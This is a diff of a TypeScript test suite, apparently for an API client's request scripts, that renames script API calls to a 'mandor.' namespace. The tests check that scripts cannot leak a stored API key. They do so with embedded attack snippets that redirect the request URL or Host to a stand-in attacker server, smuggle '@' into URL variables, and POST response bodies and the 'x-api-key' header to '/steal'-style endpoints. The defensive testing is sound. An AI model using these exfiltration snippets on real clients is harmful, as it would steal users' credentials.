@@ -31,14 +31,14 @@ function sendKeyed(url: string, source: string, headers = [KEY_LINE]) {
 
 describe('a script that moves where the send goes', () => {
     it('sends no secret to the url it wrote, and leaves the line of the person as text', async () => {
-        await sendKeyed('{{baseUrl}}/echo', `request.url = '${attack.evil.url}/steal';`);
+        await sendKeyed('{{baseUrl}}/echo', `mandor.request.url = '${attack.evil.url}/steal';`);
 
         nothingStolen();
         expect(attack.evil.hits[0]?.headers['x-api-key']).toBe('{{token}}');
     });
 
     it('sends no secret through a variable of the url it set, now or in the next send', async () => {
-        await sendKeyed('{{base}}/steal', `vars.set('base', '${attack.evil.url}');`);
+        await sendKeyed('{{base}}/steal', `mandor.variables.set('base', '${attack.evil.url}');`);
         await attack.send({ url: '{{base}}/steal', headers: [KEY_LINE] });
 
         nothingStolen();
@@ -47,8 +47,11 @@ describe('a script that moves where the send goes', () => {
     });
 
     it('sends no secret when it writes Host, or sets what a Host line of the person reads', async () => {
-        await sendKeyed('{{baseUrl}}/echo', `request.headers.set('Host', '${attack.evil.host}');`);
-        await sendKeyed('{{baseUrl}}/echo', `vars.set('h', '${attack.evil.host}');`, [
+        await sendKeyed(
+            '{{baseUrl}}/echo',
+            `mandor.request.headers.set('Host', '${attack.evil.host}');`,
+        );
+        await sendKeyed('{{baseUrl}}/echo', `mandor.variables.set('h', '${attack.evil.host}');`, [
             KEY_LINE,
             line('Host', '{{h}}'),
         ]);
@@ -72,14 +75,17 @@ describe('a script that moves where the send goes', () => {
         ];
 
         for (const url of bent) {
-            await sendKeyed('{{baseUrl}}/echo', `request.url = '${url}';`);
+            await sendKeyed('{{baseUrl}}/echo', `mandor.request.url = '${url}';`);
         }
 
         nothingStolen();
     });
 
     it('sends no secret when a value it set next to the host moves it', async () => {
-        await sendKeyed('{{baseUrl}}{{p}}/steal', `vars.set('p', '@${attack.evil.host}');`);
+        await sendKeyed(
+            '{{baseUrl}}{{p}}/steal',
+            `mandor.variables.set('p', '@${attack.evil.host}');`,
+        );
 
         nothingStolen();
     });
@@ -87,12 +93,12 @@ describe('a script that moves where the send goes', () => {
     it('refuses a value it set that moves the authority, inside a subdomain or with @', async () => {
         const evil = attack.evil.host;
 
-        await sendKeyed('{{baseUrl}}/echo', `request.url = 'http://{{token}}.${evil}/';`);
-        await sendKeyed('http://{{sub}}.localhost/', `vars.set('sub', '{{token}}');`);
+        await sendKeyed('{{baseUrl}}/echo', `mandor.request.url = 'http://{{token}}.${evil}/';`);
+        await sendKeyed('http://{{sub}}.localhost/', `mandor.variables.set('sub', '{{token}}');`);
 
         const moved = await sendKeyed(
             'http://{{sub}}127.0.0.1/',
-            `vars.set('sub', 'a@${evil}/x?');`,
+            `mandor.variables.set('sub', 'a@${evil}/x?');`,
         );
 
         nothingStolen();
@@ -105,12 +111,12 @@ describe('a script that moves where the send goes', () => {
             url: '{{baseUrl}}/echo',
             headers: [KEY_LINE],
             ...scripts(
-                `const leak = await sendRequest({ url: '${attack.origin}/leak' });
-                 await sendRequest({ url: '${attack.evil.url}/a', method: 'POST', body: leak.text() });`,
+                `const leak = await mandor.sendRequest({ url: '${attack.origin}/leak' });
+                 await mandor.sendRequest({ url: '${attack.evil.url}/a', method: 'POST', body: leak.text() });`,
                 `const steal = (path, body) =>
-                     sendRequest({ url: '${attack.evil.url}' + path, method: 'POST', body });
-                 await steal('/b', response.text());
-                 await steal('/c', JSON.stringify(request.headers.get('x-api-key')));`,
+                     mandor.sendRequest({ url: '${attack.evil.url}' + path, method: 'POST', body });
+                 await steal('/b', mandor.response.text());
+                 await steal('/c', JSON.stringify(mandor.request.headers.get('x-api-key')));`,
             ),
         });
         await vi.waitFor(() => {
@@ -127,9 +133,9 @@ describe('a script that moves where the send goes', () => {
         await attack.send({
             url: '{{baseUrl}}/echo',
             ...scripts(`
-                await sendRequest({ url: '${attack.evil.url}/x', headers: { 'X-K': '{{token}}' } });
-                const found = await sendRequest({ url: '${attack.origin}/found' });
-                vars.set('status', String(found.status));
+                await mandor.sendRequest({ url: '${attack.evil.url}/x', headers: { 'X-K': '{{token}}' } });
+                const found = await mandor.sendRequest({ url: '${attack.origin}/found' });
+                mandor.variables.set('status', String(found.status));
             `),
         });
         await attack.send({ url: '{{baseUrl}}/echo', headers: [line('X-Status', '{{status}}')] });
@@ -147,7 +153,7 @@ describe('a send that waits for the scripts of an answer', () => {
             url: '{{baseUrl}}/echo',
             ...scripts(
                 undefined,
-                `await sendRequest({ url: '${attack.origin}/echo' }); vars.set('x', 'kept');`,
+                `await mandor.sendRequest({ url: '${attack.origin}/echo' }); mandor.variables.set('x', 'kept');`,
             ),
         });
         await attack.send({ url: '{{baseUrl}}/echo', headers: [line('X-X', '{{x}}')] });
@@ -160,7 +166,7 @@ describe('a send that waits for the scripts of an answer', () => {
 
         await attack.send({
             url: '{{baseUrl}}/echo',
-            ...scripts(undefined, `await sendRequest({ url: '${attack.origin}/slow' });`),
+            ...scripts(undefined, `await mandor.sendRequest({ url: '${attack.origin}/slow' });`),
         });
         await vi.waitFor(() => {
             expect(attack.received).toHaveLength(2);
